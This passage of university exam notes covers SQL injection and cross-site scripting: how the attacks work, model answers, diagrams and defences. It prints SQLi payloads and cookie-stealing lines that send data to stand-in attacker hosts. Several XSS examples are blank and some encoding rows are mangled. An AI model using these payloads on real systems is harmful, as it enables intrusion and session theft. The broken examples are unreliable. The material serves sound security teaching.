- If the first character of the version is `'5'`, the database **sleeps for 5 seconds** before responding.
- The attacker measures the response time. A delay of ~5 seconds means the guess was correct.
- The attacker iterates through all printable ASCII characters and all positions.

**Time-based complexity:** For a string of length $n$ from an alphabet of size $a$, the attacker must make $\mathcal{O}(n \cdot a)$ requests. For alphanumeric MySQL versions (~6 chars, alphabet ~62), this is $\approx 372$ requests.

### 3.5 The Mitigation Equation — Why Parameterized Queries Work

A parameterized query **separates code from data** at the API level. The query is **compiled** before the data is bound:

```php
// SECURE CODE
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $user, $pass);
$stmt->execute();
```

**Logical Proof of Safety:**

- The SQL engine receives the **query template first** and compiles it.
- The user input is then **bound as a typed parameter** (`s` = string), never as executable code.
- Even if the input is `admin' --`, the database treats it as the **literal string value** to compare against the column, not as SQL syntax.

$$
Q_{\text{parameterized}} = \underbrace{\texttt{SELECT * FROM users WHERE username = ? AND password = ?}}_{\text{Compiled once, immutable}} \quad \text{with} \quad \text{params} = (\texttt{admin' --}, \texttt{xyz})
$$

The injection characters are **escaped/quoted by the driver** automatically, neutralizing the attack.

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
## 4. Structural Diagrams & Schematics

### 4.1 Block-Level Architecture — The SQL Injection Attack Flow

```mermaid
flowchart TD
    A[Attacker Crafts Malicious Input] --> B[Input Submitted via Form URL or Cookie]
    B --> C[Web Application Server Receives Input]
    C --> D{Input Sanitization Present}
    D -- No --> E[Malicious SQL Concatenated into Query String]
    D -- Yes --> F[Input Sanitized or Rejected]
    F --> G[Query Compiled and Executed Safely]
    E --> H[Database Engine Parses and Executes Malicious Query]
    H --> I[Database Returns Data or Modifies State]
    I --> J[Application Renders Response with Leaked Data]
    J --> K[Attacker Exfiltrates Sensitive Information]
    H --> L[Database Authentication Bypassed]
    L --> M[Attacker Gains Unauthorized Access]
    G --> N[Application Functions Normally]
```

### 4.2 Conceptual Diagram — SQLi Attack Lifecycle (Recon to Exfiltration)

```mermaid
flowchart LR
    R1[Step 1 Reconnaissance Identify Input Vectors] --> R2[Step 2 Probe with Special Characters Single Quote or Double Dash]
    R2 --> R3[Step 3 Fingerprint the DBMS MySQL MSSQL Oracle PostgreSQL]
    R3 --> R4[Step 4 Select SQLi Strategy In band Blind or Out of band]
    R4 --> R5[Step 5 Craft Tailored Payload UNION SELECT or Boolean or Time]
    R5 --> R6[Step 6 Exfiltrate Data Dump Users Tables Files]
    R6 --> R7[Step 7 Post Exploitation Privilege Escalation Pivot or Persistence]
```

### 4.3 Schematic — Vulnerable vs. Secure Data Flow

```mermaid
flowchart TD
    subgraph VULN[Vulnerable Architecture]
        V1[User Input Raw] --> V2[String Concatenation] --> V3[Raw SQL Query with Inline User Data] --> V4[Database Engine Executes Combined Code plus Data]
    end

    subgraph SEC[Secure Architecture]
        S1[User Input Raw] --> S2[Prepared Statement with Bound Parameters] --> S3[SQL Query Compiled First Code and Data Separated] --> S4[Database Engine Treats User Input as Data Only]
    end
```

### 4.4 Diagram — Mitigation Defense-in-Depth Stack

```mermaid
flowchart TD
    L1[Layer 1 Parameterized Queries] --> L2[Layer 2 Stored Procedures with Input Validation]
    L2 --> L3[Layer 3 Whitelist Input Validation]
    L3 --> L4[Layer 4 Least Privilege DB User Accounts]
    L4 --> L5[Layer 5 Web Application Firewall WAF]
    L5 --> L6[Layer 6 Continuous Security Scanning and Code Review]
```

> [!NOTE]
> **KTU Visualization Tip:** When drawing a block diagram in your answer sheet, always label each block with **inputs and outputs** and use **arrows** to show the direction of data flow. Examiners award partial marks for clear diagrams.

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### 5.1 Part A — Short Answer Questions (3 Marks Each)

#### **Question 1** `[KTU University Exam – May 2024]`
**Define SQL Injection. List any two types of SQL Injection attacks.**

**Model Answer (3 Marks):**

**Definition (2 marks):**
SQL Injection (SQLi) is a code injection technique in which an attacker inserts malicious SQL statements into an input field that is later passed to a backend database for execution. It exploits applications that fail to properly validate, filter, or sanitize user input, allowing the attacker to view data they are not normally authorized to retrieve, modify or delete it, or even issue administrative commands to the database.

**Types (1 mark — list any two):**
1. **In-band SQLi (Error-Based or Union-Based):** The attacker uses the same communication channel to launch the attack and gather results.
2. **Blind SQLi (Boolean-Based or Time-Based):** The attacker infers data by observing differences in the application's response or response time.
3. *(Optional third)* **Out-of-Band SQLi:** Data is exfiltrated through a different channel such as DNS or HTTP requests from the database server.

> [!WARNING]
> **Examiner's Pitfall Callout:** Students frequently write only the *definition* and forget to list the types. Both parts are compulsory. Marks are split as: **2 marks for definition + 1 mark for types**. Skipping the types loses you 1 full mark.

---

#### **Question 2** `[KTU University Exam – Dec 2023]`
**Differentiate between Blind Boolean-Based SQLi and Time-Based Blind SQLi.**

**Model Answer (3 Marks):**

| Parameter | Boolean-Based Blind SQLi | Time-Based Blind SQLi |
|---|---|---|
| **Inference Mechanism** | True/False based on visible page differences (e.g., "Welcome" vs. "Not found") | True/False based on response **time delay** |
| **Database Function Used** | Conditional logic evaluated by application response | `SLEEP()` (MySQL) / `WAITFOR DELAY` (MSSQL) |
| **Application Behavior** | Page content changes | Page content identical; only latency changes |
| **Detection Difficulty** | Moderate | Higher (requires timing analysis) |
| **Example Payload** | `1' AND 1=1--` vs. `1' AND 1=2--` | `1' AND SLEEP(5)--` |

**Conclusion (½ mark):** Both techniques are used when the application does not display query results or errors directly, but they differ in the **channel of inference** — *content-based* versus *time-based*.

---

### 5.2 Part B — Long Answer Questions (14 Marks Each, Internal Choice)

> **KTU 2024 Pattern:** Each Part B question carries **14 marks** and contains **two sub-parts of 7 marks each** (e.g., (a) and (b)). Students must answer **either** Question A **or** Question B in full.

---

#### **Question A (Choice 1) — 14 Marks** `[KTU University Exam – Model Paper 2024]`

**(a) Explain the different types of SQL Injection attacks with suitable examples. (7 Marks)**

**Model Answer:**

**1. In-band SQLi (Classic) — 2 Marks**
The attacker uses the **same communication channel** to inject SQL and retrieve results. Two sub-types:
- **Error-Based SQLi:** Forces the database to produce error messages that reveal schema information.
  - Example: `1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--` → Causes an XPATH error leaking the MySQL version.
- **Union-Based SQLi:** Uses the `UNION` operator to combine the original query's results with a malicious one.
  - Example: `1' UNION SELECT username, password FROM users--` → Returns credentials within the application's normal response.

**2. Blind SQLi (Inferential) — 2 Marks**
No data is returned; the attacker infers information **indirectly**.
- **Boolean-Based:** 
  - `1' AND 1=1--` → Page loads normally (TRUE)
  - `1' AND 1=2--` → Page shows "Not found" (FALSE)
  - Iterating through conditions extracts data character-by-character.
- **Time-Based:**
  - `1' AND IF(1=1, SLEEP(5), 0)--` → Response delayed by 5 seconds indicates TRUE.

**3. Out-of-Band SQLi — 1.5 Marks**
Data is exfiltrated through a **different channel** (e.g., DNS, HTTP). Useful when in-band channels are blocked.
- Example (MSSQL): `'; EXEC xp_dirtree '//attacker.com/leak'--` → Forces the database to make a DNS lookup to the attacker's server, encoding stolen data in the subdomain.

**4. Second-Order (Stored) SQLi — 1.5 Marks**
The malicious payload is **stored in the database** (e.g., in a user profile field) and later executed when another query uses that stored value unsafely.
- Example: Registering with username `admin'--`. Later, a "change password" feature uses the stored username in a query, triggering the injection.

**(b) With a neat diagram, explain the working of a SQL Injection attack. Discuss any four prevention techniques. (7 Marks)**

**Model Answer:**

**Working of SQLi — Step by Step (3.5 Marks):**

1. **Identification of Input Vector:** The attacker locates an input field (e.g., login form, `?id=` parameter).
2. **Injection of Malicious Payload:** A specially crafted string is entered, e.g., `' OR '1'='1' --`.
3. **Backend Concatenation:** The vulnerable application concatenates the input into the SQL query:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
```

4. **Query Execution:** The database parses and executes the malicious query, returning all rows.
5. **Data Exfiltration:** The attacker gains unauthorized access or extracts sensitive data from the response.

**Diagram (1.5 Marks):**

```
[Attacker] → [Web Form / URL Parameter]
        ↓
[Web Application Server] → [Concatenates input into SQL]
        ↓
[Database Engine] → [Executes malicious query]
        ↓
[Returns data to attacker via web response]
```

**Prevention Techniques (2 Marks — ½ mark each):**

1. **Parameterized Queries (Prepared Statements):** Separate code from data. User input is bound as a typed parameter, never interpreted as SQL.
2. **Stored Procedures:** Encapsulate SQL logic in the database; though parameterization is still recommended inside them.
3. **Input Validation (Whitelisting):** Reject inputs that don't match expected patterns (e.g., numeric IDs only).
4. **Principle of Least Privilege:** The database account used by the application should have only the minimum permissions required (e.g., no `DROP`, no `xp_cmdshell`).
5. **Web Application Firewall (WAF):** Detects and blocks common SQLi patterns as defense-in-depth.

> [!WARNING]
> **Examiner's Valuation Warning — Common Pitfalls:**
> 1. **Confusing "Stored Procedures" with "Prepared Statements":** They are *not* the same. Stored procedures can themselves be vulnerable if they concatenate input. Parameterized queries are the gold standard.
> 2. **Omitting the diagram:** Even a simple hand-drawn block diagram in (b) earns you **1.5 marks**. Many students skip it and lose easy marks.
> 3. **Writing "use input validation" without specifying "whitelist" or "server-side":** Client-side validation can be bypassed trivially. Always specify **server-side whitelist validation**.
> 4. **Forgetting the "comment" payload ` --` or `#`:** In authentication-bypass examples, failing to terminate the rest of the query is a classic mistake.

---

#### **Question B (Choice 2) — 14 Marks** `[KTU University Exam – Model Paper 2024]`

**(a) What is SQL Injection? Explain the impact of a successful SQLi attack on a web application. (7 Marks)**

**Model Answer:**

**Definition (2 Marks):**
SQL Injection is a vulnerability in web applications where an attacker can insert malicious SQL statements into input fields that are executed by the backend database, enabling unauthorized data access, modification, or administrative control.

**Impact of a Successful SQLi Attack (5 Marks):**

| Impact Category | Description | Severity |
|---|---|---|
| **1. Authentication Bypass** | Login as any user (e.g., admin) without credentials. | Critical |
| **2. Data Confidentiality Breach** | Steal entire database: PII, passwords, credit cards. | Critical |
| **3. Data Integrity Loss** | INSERT / UPDATE / DELETE rows; deface website content. | High |
| **4. Data Availability Attack** | Use `DROP TABLE` or `TRUNCATE` to wipe data; ransomware. | Critical |
| **5. Remote Code Execution (RCE)** | MSSQL `xp_cmdshell`, MySQL `UDF`, or `INTO OUTFILE` → OS shell. | Critical |
| **6. Lateral Movement** | Pivot from web app to internal network using harvested credentials. | High |
| **7. Compliance Violation** | Breach of PCI-DSS, GDPR, HIPAA, etc. → legal & financial penalties. | High |

**Conclusion (½ mark):** SQL Injection is one of the most devastating web vulnerabilities because it can compromise **confidentiality, integrity, and availability** — the entire **CIA triad** of information security.

**(b) Describe the countermeasures against SQL Injection. Why are parameterized queries considered the most effective solution? (7 Marks)**

**Model Answer:**

**Countermeasures (3.5 Marks):**

1. **Parameterized Queries (Prepared Statements):** Bind user input as data, not code.
2. **Stored Procedures:** Encapsulate SQL logic; combine with parameterization.
3. **Server-Side Whitelist Input Validation:** Reject unexpected characters.
4. **Escaping User Input:** Use database-specific escape functions (e.g., `mysqli_real_escape_string`) — though **OWASP considers this secondary**.
5. **Principle of Least Privilege:** Limit DB account permissions.
6. **WAF / IDS / IPS:** Detect and block malicious patterns.
7. **Regular Security Audits & Code Review:** Static (SAST) and dynamic (DAST) analysis.

**Why Parameterized Queries are the Most Effective (3.5 Marks):**

1. **Architectural Separation of Code and Data:** The SQL query is compiled *before* user data is inserted. The database engine **cannot be tricked** into executing the data as code.
2. **Database Driver Enforces Typing:** Bound parameters are typed (`s` for string, `i` for integer). Even if the input is `admin' OR 1=1--`, it is treated as the **literal string** `"admin' OR 1=1--"`, not SQL.
3. **OWASP and NIST Recommendation:** Explicitly cited as the **primary defense** in OWASP Cheat Sheets and NIST SP 800-53 SI-10.
4. **Performance Bonus:** Prepared statements are compiled once and reused → **faster execution** on repeated queries.
5. **No Reliance on Blacklists:** Unlike escaping or WAFs, it does not depend on identifying "bad" characters; all input is treated as data by design.

> [!WARNING]
> **Examiner's Pitfall — Common Mistakes in (b):**
> 1. **Listing input validation as the #1 defense:** It is important but **secondary**. Parameterized queries come first in the KTU marking key.
> 2. **Failing to mention "server-side" validation:** Client-side validation is bypassable. Always specify.
> 3. **Not justifying *why* parameterized queries are best:** The 3.5 marks for the second part are awarded for the **justification**, not just listing the technique.

---

### 5.3 Topic Recap & Important Things to Remember (Rapid-Revision Checklist)

> [!IMPORTANT]
> **KTU Rapid-Revision Checklist — SQL Injection**

- **Definition:** SQL Injection is the insertion of malicious SQL statements into input fields to manipulate the backend database query.
- **CWE-89 / OWASP A03:2021** — Official classification marks.
- **Root Cause:** Failure to separate **code (SQL)** from **data (user input)**.
- **Five-Stage Attack Lifecycle:** Recon → Probe → Fingerprint → Craft Payload → Exfiltrate.
- **Three Primary Categories:**
  1. **In-band** (Error-Based, Union-Based) — easiest to exploit.
  2. **Blind / Inferential** (Boolean-Based, Time-Based) — hardest in-band; uses inference.
  3. **Out-of-band** (DNS, HTTP exfiltration) — used when other channels fail.
- **Second-Order (Stored) SQLi:** Payload stored, triggered later — hardest to detect.
- **Authentication Bypass Payloads to Memorize:**
  - `' OR '1'='1' --`
  - `' OR 1=1 --`
  - `admin' --`
- **UNION-Based Payload Formula:** `' UNION SELECT col1, col2 FROM target_table--`
- **Time-Based Formula:** `1' AND IF(condition, SLEEP(5), 0)--`
- **Boolean-Based Formula:** `1' AND (SUBSTRING(@@version,1,1))='M'--`
- **Primary Defense (Gold Standard):** **Parameterized Queries / Prepared Statements.**
- **Defense-in-Depth Stack:** Parameterized Queries → Stored Procedures → Whitelist Validation → Least Privilege → WAF → Code Review.
- **Common Comment Markers:** `--` (MySQL/MSSQL/PostgreSQL), `#` (MySQL only), `/* ... */` (multi-line).
- **Tools to Know (for lab/viva):** **sqlmap**, **Burp Suite**, **Havij**, **jSQL Injection**.
- **IoT Context (Module 2 Linkage):** Many IoT devices run **SQLite** for local storage; insecure web admin panels on devices like routers, IP cameras, and smart hubs are common SQLi targets.
- **Compliance Tags:** PCI-DSS 6.5.1, ISO 27001 A.14.2.5, NIST SP 800-53 SI-10, GDPR Article 32.
- **Examination Tip:** Always draw a **block diagram** in long-answer questions — it carries **1.5 to 2 marks** and is a guaranteed score booster.

<!-- SECTION_5_END -->

topics.title: Cross Site Scripting
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME** > - **Course:** PBCCT604 - ETHICAL HACKING & IOT SECURITY > - **Module:** Module Module 2 > - **Topic:** Cross Site Scripting # 1. Core Technical Definition & Intuitive Overview ## 1.1 Formal Academic Definition **Cross-Site Scripting (XSS)** is a client-side code injection attack in which an adversary injects malicious scripts (typically JavaScript, but also HTML, VBScript, or Flash) into the content of a trusted, legitimate website. When an unsuspecting victim's browser loads the compromised page, the injected script executes within the trusted security context of the victim's session, allowing the attacker to bypass the **Same-Origin Policy (SOP)** and steal sensitive data such as session cookies, tokens, credentials, or to perform unauthorized actions on behalf of the victim. XSS is classified by the **Open Web Application Security Project (OWASP)** as one of the top application security risks. It is a vulnerability that occurs when an application takes **untrusted input** and sends it to a web browser without proper **validation** or **escaping**, allowing the attacker's script to be executed by the victim's browser. > [!IMPORTANT] > **KTU 2024 Syllabus Definition:** > *XSS is a type of injection vulnerability in which malicious scripts are injected into otherwise benign and trusted websites. It occurs when an application sends data to a web browser without validating or encoding it, allowing attacker-controlled script code to execute in the victim's browser context.* ## 1.2 Conceptual Analogy / Intuition Think of XSS like a **poisoned letter delivered to your home mailbox** by a trusted postal worker: - You have a **mailbox (the web application)** that you trust completely. - A **trickster (the attacker)** slips a **fake letter (malicious script)** into your mailbox. - When **you (the victim)** open the letter at home, the trickster's instructions begin executing **inside your house** — the script now has the same authority as you do, because it came through a trusted channel. - The postal worker (the web server) had no idea the letter was malicious — it just delivered what was handed to it. The "letter" here is the HTTP response. The "house" is the victim's browser. The "trickster" is the attacker. The mailbox owner trusts the postal service completely, which is exactly what makes this attack devastating. > [!NOTE] > **Key Insight for KTU Exam:** XSS is a **trust exploitation** attack. The browser trusts the script because it appears to come from a legitimate source (the website), even though the content was actually injected by an attacker. ## 1.3 Core Terminology (Syllabus-Aligned) | Term | Definition | Significance | |------|------------|--------------| | **Same-Origin Policy (SOP)** | Browser security mechanism that restricts scripts from one origin from accessing data of another origin | XSS bypasses this by running within the trusted origin | | **Payload** | The malicious script/code delivered to the victim | The actual attack vector | | **Session Hijacking** | Theft of session cookies to impersonate the victim | Primary impact of XSS | | **DOM** | Document Object Model — the in-memory tree representation of the page | DOM-based XSS exploits client-side JavaScript | | **Reflected** | XSS delivered via a single HTTP request/response | Non-persistent | | **Stored / Persistent** | XSS saved on the server and delivered to multiple victims | Most dangerous type | | **Sanitization** | Cleaning/removing malicious code from input | Primary defense mechanism | | **Encoding / Escaping** | Transforming special characters into safe HTML entities (`<` → `<`) | Critical XSS defense | ## 1.4 Standard Severity Metrics - **CVSS (Common Vulnerability Scoring System) Score for XSS:** Typically ranges from **6.1 (Medium)** for reflected XSS to **8.8 (High)** for stored XSS in authenticated contexts. - **OWASP Top 10 (2021):** Cross-Site Scripting falls under **A03:2021 – Injection**, ranking among the most critical web application vulnerabilities. - **CWE (Common Weakness Enumeration) Identifier:** **CWE-79** — "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')". # 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet ## 2.1 Operational Breakdown of an XSS Attack XSS exploits the **implicit trust relationship** between a user, a web browser, and a web server. The attack unfolds in **structured, identifiable steps**: ### Step 1: Vulnerability Discovery (Reconnaissance Phase) - The attacker identifies an input field (search box, comment form, URL parameter, profile field) that **reflects user input back** to the page without sanitization. - Tools used: **Burp Suite, OWASP ZAP, manual inspection of HTML source**. ### Step 2: Payload Crafting - The attacker constructs a malicious string (payload) that bypasses naive input filters and executes JavaScript in the browser. - Example classic payload: `` - Example cookie-stealing payload: ```html ``` ### Step 3: Delivery Vector Selection - The attacker chooses **how** the payload reaches the victim: - **Reflected XSS:** Embeds payload in a URL, tricks victim into clicking (via email, social engineering). - **Stored XSS:** Posts payload into a persistent field (comment, profile, product review) that will be served to all future visitors. - **DOM-based XSS:** Manipulates client-side JavaScript environment (e.g., `document.location.hash`). ### Step 4: Execution in Victim's Browser - The victim's browser receives the malicious code as part of a **trusted response** from the legitimate website. - The browser **parses and executes** the script in the **security context of the website's origin**. - The Same-Origin Policy considers the script legitimate, granting it access to cookies, session tokens, and DOM of that origin. ### Step 5: Exploitation - The malicious script performs the attacker's intended action: - Steals `document.cookie` and transmits it to attacker's server. - Reads CSRF tokens to perform unauthorized transactions. - Defaces the page. - Redirects the user to a phishing site. - Captures keystrokes via injected event listeners. ## 2.2 The Three Primary Types of XSS ### Type 1: Reflected XSS (Non-Persistent) - **Mechanism:** The malicious script is "reflected" off the web server, typically via a URL parameter, search query, or form submission, and immediately echoed back in the HTTP response. - **Persistence:** Non-persistent — only affects the victim who clicks the crafted link. - **Delivery:** Requires social engineering (phishing email, forum post, instant message). - **Severity:** Medium — depends on the social engineering campaign's success. - **Example vulnerable URL pattern:** ``` https://vulnerable-site.com/search?q= ``` If `q` parameter is rendered directly into the page without escaping, the script executes. ### Type 2: Stored XSS (Persistent) - **Mechanism:** The malicious script is permanently stored on the target server (in a database, message forum, comment field, user profile) and is served to every user who views the affected page. - **Persistence:** Persistent — affects all visitors over time. - **Delivery:** No social engineering required for each victim; just one successful injection. - **Severity:** High — often called the "nuclear option" of XSS due to its self-propagating nature. - **Example:** A comment in a blog post containing `` is stored in the database and executed in every visitor's browser. ### Type 3: DOM-Based XSS - **Mechanism:** The vulnerability exists entirely in the **client-side JavaScript code**, not in the server's response. The server's response is not modified; instead, unsafe JavaScript reads a tainted source (like `location.hash`, `location.search`, `document.referrer`) and writes it into the DOM unsafely. - **Persistence:** Non-persistent in the server sense, but persistent in the client-side execution flow. - **Detection:** Harder to detect with traditional server-side scanners; requires JavaScript code review. - **Example vulnerable client-side code:** ```javascript // Vulnerable: reads from URL hash and writes to DOM document.write("Welcome " + location.hash.substring(1)); ``` Exploited via: `https://site.com/welcome#` ## 2.3 KTU High-Yield Formula Sheet / Cheat Sheet | Formula / Concept | Expression | Purpose | |-------------------|------------|---------| | **Same-Origin Policy (SOP) Check** | `protocol + host + port` must match | Determines whether script can access a resource | | **XSS Payload Categorization** | `Stored > Reflected > DOM` (in terms of impact) | Severity ranking | | **HTML Entity Encoding** | `<` → `<`, `>` → `>`, `&` → `&`, `"` → `"`, `'` → `'` | Defense via output encoding | | **Cookie Theft Formula** | `document.location='http://attacker/?c='+document.cookie` | Standard exfiltration | | **XSS Attack Impact Score** | `Impact = f(reach, damage, exploitability)` | CVSS-aligned evaluation | | **Content Security Policy (CSP)** | `Content-Security-Policy: script-src 'self'` | Defense-in-depth header | | **HttpOnly Flag** | `Set-Cookie: session=abc; HttpOnly` | Prevents JavaScript access to cookie | | **X-XSS-Protection Header** | `X-XSS-Protection: 1; mode=block` | Legacy browser-side XSS filter | | **Input Validation (Whitelist)** | `Allow only [a-zA-Z0-9]` | Strict server-side validation | | **Trusted Types Policy** | `trustedTypes.createPolicy('default', {createHTML: s => DOMPurify.sanitize(s)})` | Modern DOM XSS mitigation | ## 2.4 Real-World Engineering Utility XSS knowledge is critical in: - **Web Application Penetration Testing** — identifying client-side injection flaws. - **Secure Software Development Life Cycle (SDLC)** — building XSS-resistant applications. - **Security Operations Center (SOC)** — detecting XSS in WAF logs. - **Bug Bounty Programs** — high-value vulnerabilities on platforms like HackerOne, Bugcrowd. - **Incident Response** — analyzing XSS-based credential theft campaigns. - **IoT Security** — many IoT web interfaces suffer XSS, enabling device compromise. - **Browser Security Engineering** — designing SOP, CSP, Trusted Types mechanisms. # 3. Step-by-Step Attack Analysis & Analytical Matrix ## 3.1 Detailed Reflected XSS Attack Flow (Step-by-Step) The following analytical walkthrough demonstrates the end-to-end execution of a **Reflected XSS** attack, using a vulnerable search page as the case study. ### Step 1: Identify the Injection Point The attacker visits `https://vulnerable-site.com/search` and tests whether the `q` parameter is reflected in the HTML response without sanitization. A test request is issued: ``` GET /search?q=test123 HTTP/1.1 Host: vulnerable-site.com ``` The server responds with: ```html Search results for: test123 ``` The parameter `q` is reflected verbatim. **No encoding is applied.** The injection point is confirmed. ### Step 2: Craft a Benign Test Payload To confirm the script execution capability, the attacker injects a non-destructive JavaScript alert: ``` GET /search?q= HTTP/1.1 ``` The server responds with: ```html Search results for: ``` The victim's browser **parses the script tag** and **executes** the JavaScript `alert('XSS')`, displaying a popup. The vulnerability is confirmed. ### Step 3: Construct the Cookie-Stealing Payload The attacker builds a payload that exfiltrates the victim's session cookie to a server they control: ```html ``` Encoded into a URL: ``` https://vulnerable-site.com/search?q= ``` ### Step 4: Deliver the Malicious Link The attacker embeds the crafted URL into a phishing email or social media post, disguised as a legitimate link from the trusted site. ### Step 5: Victim Clicks the Link The victim's browser issues the request to `vulnerable-site.com`, which returns the malicious HTML. The browser **executes the script in the context of `vulnerable-site.com`**, granting it access to all cookies associated with that origin. ### Step 6: Cookie Exfiltration The script constructs a request to `attacker-server.com/steal?cookie=`. The attacker's server logs the cookie. ### Step 7: Session Hijack The attacker uses the stolen session cookie to impersonate the victim by setting it in their own browser: ``` document.cookie = "session=stolen_cookie_value; domain=vulnerable-site.com; path=/"; ``` The attacker is now logged in as the victim, bypassing authentication entirely. ## 3.2 Analytical Comparison Matrix — XSS Types The following structured matrix compares the three XSS variants across KTU-critical dimensions: | Dimension | Reflected XSS | Stored XSS | DOM-Based XSS | |-----------|---------------|------------|---------------| | **Persistence on Server** | None (one request) | Permanent (database/file) | None (client-side only) | | **Server-Side Code Flaw?** | Yes | Yes | No (client-side flaw) | | **Client-Side Code Flaw?** | No | No | Yes | | **Social Engineering Required?** | Yes (each victim) | No (self-propagating) | Yes (link delivery) | | **Scope of Impact** | Single victim per click | All visitors of affected page | Single victim per click | | **Detection Difficulty** | Easy | Easy–Moderate | Hard | | **CVSS Severity (typical)** | 6.1 (Medium) | 8.8 (High) | 6.1 (Medium) | | **Common Vulnerable Sink** | URL parameter echoed in HTML | Database-stored content rendered in HTML | `document.write()`, `innerHTML` | | **Example Real-World Case** | Phishing email with crafted search URL | Malicious comment on forum (e.g., 2005 Samy MySpace worm) | Single-page application hash manipulation | | **Primary Defense** | Output encoding + CSP | Input sanitization + CSP + output encoding | Trusted Types + safe DOM APIs | ## 3.3 Mathematical Model of XSS Impact The total impact of an XSS vulnerability can be expressed as a weighted function of three primary factors: $$ \text{Impact}_{\text{XSS}} = (R \times w_1) + (D \times w_2) + (E \times w_3) $$ Where: $$ \begin{aligned} R &= \text{Reach (number of potential victims served the payload)} \\ D &= \text{Damage potential (data sensitivity, privilege level)} \\ E &= \text{Exploitability (ease of crafting and delivering payload)} \\ w_1, w_2, w_3 &= \text{Weighting coefficients where } w_1 + w_2 + w_3 = 1 \end{aligned} $$ For a **Stored XSS** on a high-traffic authenticated page: - $R$ = 1,000,000 (all authenticated users) → normalized as $1.0$ - $D$ = 0.9 (session hijack, account takeover) - $E$ = 0.95 (trivial to exploit, no victim interaction beyond page load) $$ \text{Impact}_{\text{Stored}} = (1.0 \times 0.5) + (0.9 \times 0.3) + (0.95 \times 0.2) $$ $$ \text{Impact}_{\text{Stored}} = 0.5 + 0.27 + 0.19 = 0.96 \quad \text{(Critical)} $$ For a **Reflected XSS** requiring phishing: - $R$ = 0.2 (only those tricked by phishing) - $D$ = 0.7 - $E$ = 0.5 (requires social engineering) $$ \text{Impact}_{\text{Reflected}} = (0.2 \times 0.5) + (0.7 \times 0.3) + (0.5 \times 0.2) $$ $$ \text{Impact}_{\text{Reflected}} = 0.10 + 0.21 + 0.10 = 0.41 \quad \text{(Medium)} $$ This model demonstrates quantitatively why **Stored XSS is prioritized** in remediation efforts. ## 3.4 Stored XSS — Database Persistence Walkthrough ### Step 1: Attacker Submits Malicious Content ```html POST /post-comment HTTP/1.1 Host: blog-site.com Content-Type: application/x-www-form-urlencoded comment= ``` ### Step 2: Server Stores Payload in Database The application saves the comment string verbatim, without HTML encoding, into a `comments` table. ### Step 3: Victim Requests the Page Any subsequent visitor requesting the affected blog post triggers a `SELECT` query that returns the malicious comment. ### Step 4: Server Renders Comment Without Sanitization The server-side template engine (e.g., legacy PHP, JSP, or unconfigured template) outputs the raw HTML into the page: ```html
``` ### Step 5: Browser Executes the Injected Script Every visitor's browser executes the script, exfiltrating their cookies to the attacker's server. ### Step 6: Attacker Collects Credentials The attacker's server logs all incoming requests with stolen cookies, enabling mass account takeover. # 4. Structural Diagrams & Schematics ## 4.1 Mermaid Diagram 1: XSS Attack Lifecycle (Reflected XSS) ```mermaid flowchart TD A[Attacker Discovers Vulnerable Parameter] --> B[Crafts Malicious JavaScript Payload] B --> C[Embeds Payload into Phishing URL] C --> D[Sends Link to Victim via Email or Message] D --> E{Victim Clicks Link?} E -- Yes --> F[Browser Sends Request to Trusted Website] F --> G[Server Reflects Payload in HTML Response] G --> H[Browser Parses HTML and Executes Script] H --> I[Script Runs in Trusted Origin Context] I --> J[Accesses document.cookie and Session Data] J --> K[Sensitive Data Sent to Attacker Server] K --> L[Attacker Hijacks Victim Session] E -- No --> M[Attack Fails] L --> N[Account Takeover or Data Theft Complete] ``` ## 4.2 Mermaid Diagram 2: Stored XSS Architecture ```mermaid flowchart LR A[Attacker Injects Script via Form] --> B[Application Server] B --> C[(Database Stores Payload Unsanitized)] C --> D[Legitimate User Requests Page] D --> B B --> E[Server Returns HTML with Embedded Script] E --> F[User Browser Executes Malicious Script] F --> G[Script Accesses Session Cookies] G --> H[Exfiltration to Attacker Controlled Server] H --> I[Attacker Uses Stolen Cookies for Unauthorized Access] ``` ## 4.3 Mermaid Diagram 3: XSS Defense Layered Architecture ```mermaid flowchart TB subgraph InputLayer[Input Validation Layer] A1[Whitelist Input Validation] A2[Reject HTML and Script Tags] A3[Length and Format Checks] end subgraph ProcessingLayer[Output Encoding Layer] B1[HTML Entity Encoding for HTML Context] B2[JavaScript Escaping for JS Context] B3[URL Encoding for URL Context] B4[CSS Escaping for Style Context] end subgraph BrowserLayer[Browser-Side Defense] C1[Content Security Policy CSP] C2[HttpOnly Cookies Flag] C3[Trusted Types API] C4[SameSite Cookie Attribute] end subgraph MonitoringLayer[Detection and Monitoring] D1[Web Application Firewall WAF] D2[Security Scanners OWASP ZAP Burp Suite] D3[Static Application Security Testing SAST] end InputLayer --> ProcessingLayer ProcessingLayer --> BrowserLayer BrowserLayer --> MonitoringLayer ``` ## 4.4 Mermaid Diagram 4: XSS Type Decision Tree ```mermaid flowchart TD Start[Identify XSS Vulnerability] --> Q1{Is Payload Stored on Server?} Q1 -- Yes --> StoredXSS[Stored XSS Type 2] Q1 -- No --> Q2{Is Vulnerability in Server-Side Code?} Q2 -- Yes --> ReflectedXSS[Reflected XSS Type 1] Q2 -- No --> Q3{Is Vulnerability in Client-Side JavaScript?} Q3 -- Yes --> DOMXSS[DOM-Based XSS Type 3] Q3 -- No --> Other[Other Variant e.g., Blind XSS, Mutation XSS] ``` ## 4.5 Mermaid Diagram 5: Block-Level Functional Architecture of XSS Exploitation ```mermaid flowchart TD subgraph AttackerInfra[Attacker Infrastructure] AT1[Payload Generator Module] AT2[C2 Command and Control Server] AT3[Data Exfiltration Collector] end subgraph VulnerableApp[Vulnerable Web Application] V1[Input Reception Endpoint] V2[Insufficient Sanitization Layer] V3[Database or Response Composer] end subgraph VictimEnvironment[Victim Browser Environment] VE1[HTML Parser] VE2[JavaScript Engine] VE3[Cookie Store] VE4[SOP Bypass Context] end AT1 --> V1 V1 --> V2 V2 --> V3 V3 --> VE1 VE1 --> VE2 VE2 --> VE3 VE2 --> VE4 VE4 --> AT2 AT2 --> AT3 ``` # 5. KTU 2024 Scheme Examination Question Bank & Topic Recap 